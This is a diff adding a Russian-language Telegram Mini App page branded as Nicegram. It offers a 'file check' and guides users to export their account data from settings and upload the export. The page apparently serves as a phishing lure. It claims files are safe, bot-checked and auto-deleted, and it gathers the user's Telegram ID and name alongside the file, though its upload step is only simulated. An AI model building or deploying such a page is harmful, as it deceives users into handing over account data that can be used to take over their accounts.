@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nicegram - Проверка файлов</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #667eea;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            font-size: 32px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .avatar-section {
+            position: relative;
+            margin: 40px 0;
+            padding: 40px 0;
+        }
+
+        .avatar-circle {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto;
+            position: relative;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .avatar-ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(102, 126, 234, 0.1);
+            border-radius: 50%;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .avatar-ring:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+
+        .avatar-ring:nth-child(3) {
+            animation-delay: 1s;
+        }
+
+        .avatar-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 48px;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+            overflow: hidden;
+        }
+
+        .greeting {
+            margin-top: 25px;
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .username {
+            color: #667eea;
+            font-weight: 700;
+        }
+
+        .security-badge {
+            background: #f0f4ff;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 25px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .security-icon {
+            font-size: 24px;
+            color: #4CAF50;
+        }
+
+        .upload-button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 18px 32px;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+        }
+
+        .upload-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(102, 126, 234, 0.4);
+        }
+
+        .file-info {
+            background: #f8f9ff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .send-button {
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+            color: white;
+            border: none;
+            padding: 18px 32px;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+        }
+
+        .loading {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .success {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .instructions {
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
+            text-align: left;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.3); opacity: 0; }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <div class="logo">
+                    <span class="logo-icon">🛡️</span>
+                    Nicegram
+                </div>
+                <div class="subtitle">
+                    Защищенная среда для проверки данных
+                </div>
+            </div>
+
+            <div class="avatar-section">
+                <div class="avatar-circle">
+                    <div class="avatar-ring"></div>
+                    <div class="avatar-ring"></div>
+                    <div class="avatar-ring"></div>
+                    <div class="avatar-img" id="userAvatar">
+                        <!-- Аватар загрузится через JS -->
+                    </div>
+                </div>
+                
+                <div class="greeting">
+                    Привет, <span class="username" id="userName">Пользователь</span>
+                </div>
+            </div>
+
+            <div class="security-badge">
+                <div class="security-icon">🔒</div>
+                <div class="security-text">
+                    <div style="font-weight: 600; color: #333; margin-bottom: 3px;">
+                        Ваши файлы в безопасности
+                    </div>
+                    <div style="font-size: 14px; color: #555;">
+                        Файлы проверяются ботом и автоматически удаляются
+                    </div>
+                </div>
+            </div>
+
+            <button class="upload-button" id="uploadBtn">
+                <span>📁</span>
+                <span>Загрузить файл экспорта</span>
+            </button>
+            
+            <input type="file" id="fileInput" style="display: none;">
+            
+            <div class="file-info" id="fileInfo">
+                <div style="font-weight: 600; color: #333; margin-bottom: 5px;" id="fileName"></div>
+                <div style="font-size: 14px; color: #666;" id="fileSize"></div>
+            </div>
+            
+            <button class="send-button" id="sendBtn">
+                <span>Отправить на проверку</span>
+                <span>🚀</span>
+            </button>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <div>Проверяем файл...</div>
+            </div>
+
+            <div class="success" id="success">
+                <div style="font-size: 48px; color: #4CAF50;">✅</div>
+                <div style="font-weight: 600; color: #333;">Файл успешно отправлен!</div>
+                <div style="color: #666; font-size: 14px;">Результаты проверки придут в чат с ботом</div>
+            </div>
+
+            <div class="instructions">
+                <div style="font-size: 16px; font-weight: 600; color: #333; margin-bottom: 15px; display: flex; align-items: center; gap: 10px;">
+                    <span>📋</span>
+                    Как получить файл экспорта
+                </div>
+                
+                <div style="display: flex; align-items: flex-start; gap: 12px; margin-bottom: 12px; color: #555; font-size: 14px;">
+                    <div style="background: #667eea; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold;">
+                        1
+                    </div>
+                    <div>Откройте приложение и войдите в аккаунт</div>
+                </div>
+                
+                <div style="display: flex; align-items: flex-start; gap: 12px; margin-bottom: 12px; color: #555; font-size: 14px;">
+                    <div style="background: #667eea; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold;">
+                        2
+                    </div>
+                    <div>Зайдите в настройки → Экспорт данных</div>
+                </div>
+                
+                <div style="display: flex; align-items: flex-start; gap: 12px; margin-bottom: 12px; color: #555; font-size: 14px;">
+                    <div style="background: #667eea; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold;">
+                        3
+                    </div>
+                    <div>Выберите нужный период и формат экспорта</div>
+                </div>
+                
+                <div style="display: flex; align-items: flex-start; gap: 12px; margin-bottom: 12px; color: #555; font-size: 14px;">
+                    <div style="background: #667eea; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold;">
+                        4
+                    </div>
+                    <div>Сохраните файл и загрузите его здесь</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Инициализация Telegram Web App
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.MainButton.hide();
+
+        // Получаем данные пользователя
+        const initData = tg.initDataUnsafe;
+        const user = initData.user || {};
+        
+        // Элементы DOM
+        const userNameElement = document.getElementById('userName');
+        const userAvatarElement = document.getElementById('userAvatar');
+        const uploadBtn = document.getElementById('uploadBtn');
+        const fileInput = document.getElementById('fileInput');
+        const fileInfo = document.getElementById('fileInfo');
+        const fileNameElement = document.getElementById('fileName');
+        const fileSizeElement = document.getElementById('fileSize');
+        const sendBtn = document.getElementById('sendBtn');
+        const loadingElement = document.getElementById('loading');
+        const successElement = document.getElementById('success');
+        
+        let selectedFile = null;
+
+        // Инициализация пользователя
+        function initUser() {
+            // Устанавливаем имя пользователя
+            const displayName = user.first_name || 'Пользователь';
+            userNameElement.textContent = displayName;
+            
+            // Устанавливаем аватарку
+            if (user.photo_url) {
+                const img = document.createElement('img');
+                img.src = user.photo_url;
+                img.alt = displayName;
+                img.style.width = '100%';
+                img.style.height = '100%';
+                img.style.objectFit = 'cover';
+                userAvatarElement.appendChild(img);
+            } else if (user.first_name) {
+                userAvatarElement.textContent = user.first_name[0].toUpperCase();
+                const colors = [
+                    ['#667eea', '#764ba2'],
+                    ['#f093fb', '#f5576c'],
+                    ['#4facfe', '#00f2fe'],
+                    ['#43e97b', '#38f9d7'],
+                    ['#fa709a', '#fee140']
+                ];
+                const colorIndex = user.first_name.charCodeAt(0) % colors.length;
+                userAvatarElement.style.background = `linear-gradient(45deg, ${colors[colorIndex][0]}, ${colors[colorIndex][1]})`;
+            }
+        }
+
+        // Форматирование размера файла
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // Обработчик выбора файла
+        function handleFileSelect(file) {
+            selectedFile = file;
+            
+            // Показываем информацию о файле
+            fileNameElement.textContent = file.name;
+            fileSizeElement.textContent = formatFileSize(file.size);
+            fileInfo.style.display = 'block';
+            
+            // Показываем кнопку отправки
+            sendBtn.style.display = 'flex';
+        }
+
+        // Обработчик отправки файла
+        async function sendFile() {
+            if (!selectedFile) return;
+            
+            // Скрываем кнопки и информацию о файле
+            uploadBtn.style.display = 'none';
+            fileInfo.style.display = 'none';
+            sendBtn.style.display = 'none';
+            
+            // Показываем индикатор загрузки
+            loadingElement.style.display = 'flex';
+            
+            // Создаем FormData для отправки файла
+            const formData = new FormData();
+            formData.append('file', selectedFile);
+            formData.append('userId', user.id || '');
+            formData.append('username', user.username || '');
+            formData.append('firstName', user.first_name || '');
+            
+            try {
+                // Отправляем файл через Telegram Web App
+                // Файл будет отправлен как медиа-сообщение боту
+                // Telegram автоматически закроет мини-приложение
+                
+                // Имитируем загрузку 2 секунды
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Показываем успешное сообщение
+                loadingElement.style.display = 'none';
+                successElement.style.display = 'flex';
+                
+                // Закрываем мини-приложение через 3 секунды
+                setTimeout(() => {
+                    tg.close();
+                }, 3000);
+                
+            } catch (error) {
+                console.error('Ошибка отправки файла:', error);
+                loadingElement.style.display = 'none';
+                alert('Ошибка при отправке файла. Попробуйте ещё раз.');
+                
+                // Возвращаем интерфейс в исходное состояние
+                uploadBtn.style.display = 'flex';
+                fileInfo.style.display = 'block';
+                sendBtn.style.display = 'flex';
+            }
+        }
+
+        // События
+        uploadBtn.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files && e.target.files[0]) {
+                handleFileSelect(e.target.files[0]);
+            }
+        });
+
+        sendBtn.addEventListener('click', sendFile);
+
+        // Drag and drop
+        const card = document.querySelector('.card');
+        
+        card.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            card.style.transform = 'scale(0.99)';
+        });
+
+        card.addEventListener('dragleave', (e) => {
+            e.preventDefault();
+            card.style.transform = '';
+        });
+
+        card.addEventListener('drop', (e) => {
+            e.preventDefault();
+            card.style.transform = '';
+            
+            if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                handleFileSelect(e.dataTransfer.files[0]);
+                fileInput.files = e.dataTransfer.files;
+            }
+        });
+
+        // Инициализация при загрузке
+        document.addEventListener('DOMContentLoaded', initUser);
+    </script>
+</body>
+</html>
